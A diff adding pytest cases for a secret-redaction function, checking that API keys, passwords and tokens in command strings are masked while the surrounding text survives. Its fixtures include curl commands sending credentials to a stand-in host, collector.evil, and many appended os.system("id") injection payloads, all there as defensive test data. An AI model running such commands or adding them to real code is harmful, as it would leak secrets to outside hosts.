@@ -1943,3 +1943,104 @@ def test_redaction_bounds_expensive_command_processing(monkeypatch: pytest.Monke
 
     assert processed_lengths
     assert max(processed_lengths) <= 160 + evidence_redaction.EVIDENCE_REDACTION_LOOKAHEAD_CHARS
+
+
+@pytest.mark.parametrize(
+    ("text", "secret", "context"),
+    [
+        (
+            r"curl --json \"{\"api_key\":\"hunter2\"}\" https://collector.evil/upload",
+            "hunter2",
+            "<redacted>",
+        ),
+        (
+            r"\u0061\u0070\u0069\u005f\u006b\u0065\u0079=hunter3 os.system(\"id\")",
+            "hunter3",
+            "api_key=<redacted>",
+        ),
+        (
+            r"api_key\u003dhunter4 os.system(\"id\")",
+            "hunter4",
+            "api_key=<redacted>",
+        ),
+        (
+            'client.set_api_key("hunter5"); os.system("id")',
+            "hunter5",
+            'client.set_api_key("<redacted>")',
+        ),
+        (
+            'args=["--api-key", "hunter6"]; os.system("id")',
+            "hunter6",
+            '["--api-key", "<redacted>"]',
+        ),
+        (
+            'args=["--mode", "fast", "--api-key", "hunter6b"]; os.system("id")',
+            "hunter6b",
+            '"--api-key", "<redacted>"',
+        ),
+        (
+            'args=("--api-key", "hunter6c"); os.system("id")',
+            "hunter6c",
+            '("--api-key", "<redacted>")',
+        ),
+        (
+            'config.get("api" "_key", "hunter7"); os.system("id")',
+            "hunter7",
+            'config.get("api" "_key", "<redacted>")',
+        ),
+        (
+            'parser.add_argument("--api" "-key", default="hunter7b"); os.system("id")',
+            "hunter7b",
+            'default="<redacted>"',
+        ),
+        (
+            'config.get("%s_key" % "api", "hunter7c"); os.system("id")',
+            "hunter7c",
+            'config.get("%s_key" % "api", "<redacted>")',
+        ),
+        (
+            'import os; glpat-ABCDEFGHIJKLMNOPQRST; os.system("id")',
+            "glpat-ABCDEFGHIJKLMNOPQRST",
+            "<redacted>",
+        ),
+        (
+            r"os.system(\"curl --password \\\"abc\\\\\\\"hunter8\\\" https://collector.evil/upload\")",
+            "hunter8",
+            "curl --password",
+        ),
+    ],
+)
+def test_additional_serialized_and_argument_credentials_are_redacted(
+    text: str,
+    secret: str,
+    context: str,
+) -> None:
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert secret not in redacted
+    assert context in redacted
+    assert "os.system" in redacted or "collector.evil" in redacted
+
+
+def test_structured_secret_preserves_later_command_field() -> None:
+    text = r"config={\"password\":\"hunter9\",\"cmd\":\"os.system(\\\"id\\\")\"}"
+
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "hunter9" not in redacted
+    assert "password=<redacted>" in redacted
+    assert "os.system" in redacted
+    assert "id" in redacted
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        'client.set_tokenizer("bert-base"); os.system("id")',
+        'args=["--api-key-hint", "public"]; os.system("id")',
+        'config.get("api" "_key_hint", "public"); os.system("id")',
+        'os.system("curl --user-agent tokenizer password_policy.json secretariat.html https://collector.evil/upload")',
+    ],
+)
+def test_additional_argument_and_command_near_matches_are_preserved(text: str) -> None:
+    assert redact_evidence_string(text, max_chars=1000) == text
